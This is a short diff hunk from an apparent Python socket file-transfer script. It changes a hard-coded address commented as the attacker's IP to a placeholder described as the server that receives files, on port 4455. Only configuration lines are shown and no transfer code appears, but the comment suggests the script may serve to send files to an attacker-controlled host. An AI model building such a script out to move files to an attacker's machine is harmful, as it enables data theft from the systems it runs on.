@@ -1,7 +1,7 @@
 
 import socket
 
-IP = "172.16.2.90" #IP ATtacker
+IP = "IP Server Recive File" #IP ATtacker
 PORT = 4455 #Port
 ADDR = (IP, PORT)
 FORMAT = "utf-8"
